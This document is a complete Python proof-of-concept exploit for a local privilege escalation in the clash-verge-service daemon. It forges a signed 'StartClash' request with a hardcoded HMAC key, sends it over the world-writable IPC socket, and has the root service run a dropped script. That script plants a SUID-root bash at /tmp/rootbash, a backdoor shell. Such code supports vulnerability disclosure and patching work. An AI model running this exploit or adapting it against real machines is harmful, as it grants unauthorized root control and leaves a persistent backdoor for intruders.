#!/usr/bin/env python3
# clash-verge-service local privilege escalation PoC (Linux / macOS).
# Unprivileged local user -> root code execution via the 0666 IPC socket.
#
# Usage: python3 poc.py [socket_path]
import json, hmac, hashlib, socket, struct, time, sys, os, platform

SOCK = "/tmp/clash-verge-service.sock"
KEY  = hashlib.sha256(b"clash-verge-app-secret-fuck-me-until-daylight").digest()


def sign(msg):
    return hmac.new(KEY, msg.encode(), hashlib.sha256).hexdigest()


def build(bin_path):
    # payload keys lexically sorted -> matches the server's serde Value re-serialization
    payload = {
        "bin_path":    bin_path,
        "config_dir":  "/tmp",
        "config_file": "/tmp/x",
        "core_type":   "clash",
        "log_file":    "/tmp/cvs.log",
    }
    # field order = serde struct order: id, timestamp, command, payload, signature
    req = {"id": "poc-1", "timestamp": int(time.time()),
           "command": "StartClash", "payload": payload, "signature": ""}
    msg = json.dumps(req, separators=(",", ":"), ensure_ascii=False)  # signature=""
    req["signature"] = sign(msg)
    return json.dumps(req, separators=(",", ":"), ensure_ascii=False).encode()


def recvn(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            break
        b += c
    return b


def main():
    if platform.system() == "Windows":
        sys.exit("This launcher targets Linux/macOS. Use poc_win.c on Windows.")
    sock = sys.argv[1] if len(sys.argv) > 1 else SOCK

    # root payload: drop a SUID-root shell + record the executing uid
    pay = "/tmp/cvs_payload.sh"
    with open(pay, "w") as f:
        f.write("#!/bin/sh\n"
                "cp /bin/bash /tmp/rootbash 2>/dev/null\n"
                "chmod 4755 /tmp/rootbash 2>/dev/null\n"
                "id > /tmp/cvs_root_proof.txt 2>/dev/null\n")
    os.chmod(pay, 0o755)

    data = build(pay)
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(sock)
    s.sendall(struct.pack(">I", len(data)) + data)   # [u32 BE len][json]
    rl = recvn(s, 4)
    resp = recvn(s, struct.unpack(">I", rl)[0]) if len(rl) == 4 else b""
    s.close()

    print("[*] socket   :", sock)
    print("[*] bin_path :", pay)
    print("[+] response :", resp.decode(errors="replace") or "(none)")
    print("[*] proof    : cat /tmp/cvs_root_proof.txt    (uid=0 => root code exec)")
    print("[*] rootshell: /tmp/rootbash -p")


if __name__ == "__main__":
    main()